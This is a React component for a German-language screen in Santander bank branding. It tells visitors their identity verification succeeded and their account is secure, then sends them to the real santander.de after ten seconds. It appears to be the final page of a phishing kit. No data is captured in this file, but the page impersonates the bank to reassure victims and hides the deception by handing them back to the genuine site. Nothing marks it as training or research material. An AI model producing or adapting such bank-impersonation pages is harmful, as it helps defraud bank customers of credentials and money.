import React, { useEffect } from 'react';
import { CheckCircle } from 'lucide-react';

const FinalSuccessScreen: React.FC = () => {
  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://santander.de';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://santander.de';
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '60px 40px',
        backgroundColor: 'white',
        minHeight: '100vh'
      }}>
        <div style={{
          textAlign: 'left' as const,
          maxWidth: '800px'
        }}>
          <h1 className="mobile-title" style={{
            color: '#444',
            fontSize: '4rem',
            fontWeight: 'bold',
            marginBottom: '40px',
            fontFamily: 'santander_headline_bold, Arial, sans-serif',
            lineHeight: '1.1'
          }}>
            Verifizierung erfolgreich abgeschlossen
          </h1>
          
          <p style={{
            color: '#666',
            fontSize: '1.25rem',
            lineHeight: '1.6',
            marginBottom: '40px',
            fontFamily: 'santander_regular, Arial, sans-serif'
          }}>
            Ihre Identität wurde erfolgreich verifiziert. Ihr Konto ist wieder sicher und zugänglich.
          </p>
          
          <div style={{
            backgroundColor: '#d4edda',
            border: '1px solid #c3e6cb',
            borderRadius: '12px',
            padding: '40px',
            marginBottom: '40px',
            display: 'flex',
            alignItems: 'center',
            gap: '20px'
          }}>
            <CheckCircle size={48} color="#155724" />
            
            <div>
              <h3 style={{
                color: '#155724',
                fontSize: '1.5rem',
                fontWeight: '600',
                marginBottom: '10px',
                fontFamily: 'santander_headline_bold, Arial, sans-serif'
              }}>
                Sicherheitsmaßnahmen aktiviert
              </h3>
              
              <p style={{
                color: '#155724',
                fontSize: '1rem',
                lineHeight: '1.6',
                margin: 0,
                fontFamily: 'santander_regular, Arial, sans-serif'
              }}>
                Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
              </p>
            </div>
          </div>
          
          <div style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '12px',
            padding: '25px',
            marginBottom: '40px'
          }}>
            <p style={{
              color: '#856404',
              fontSize: '1rem',
              fontWeight: '500',
              margin: 0,
              textAlign: 'center' as const,
              fontFamily: 'santander_regular, Arial, sans-serif'
            }}>
              Sie werden automatisch in 10 Sekunden zu Santander.de weitergeleitet.
            </p>
          </div>
          
          <button
            onClick={handleManualRedirect}
            style={{
              backgroundColor: '#9e3667',
              color: 'white',
              border: 'none',
              borderRadius: '4px',
              padding: '16px 40px',
              fontSize: '18px',
              fontWeight: '600',
              cursor: 'pointer',
              fontFamily: 'santander_bold, Arial, sans-serif',
              transition: 'all 0.3s ease',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '10px'
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.backgroundColor = '#8a2f5a';
              e.currentTarget.style.transform = 'translateY(-1px)';
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.backgroundColor = '#9e3667';
              e.currentTarget.style.transform = 'translateY(0)';
            }}
          >
            Jetzt zu Santander.de
            <span style={{ fontSize: '1.5rem' }}>→</span>
          </button>
          
          <p style={{
            color: '#666',
            fontSize: '0.875rem',
            marginTop: '30px',
            lineHeight: '1.4',
            fontFamily: 'santander_regular, Arial, sans-serif'
          }}>
            Vielen Dank für Ihre Geduld. Ihre Sicherheit ist unsere Priorität.
          </p>
        </div>
      </div>
    </>
  );
};

export default FinalSuccessScreen; 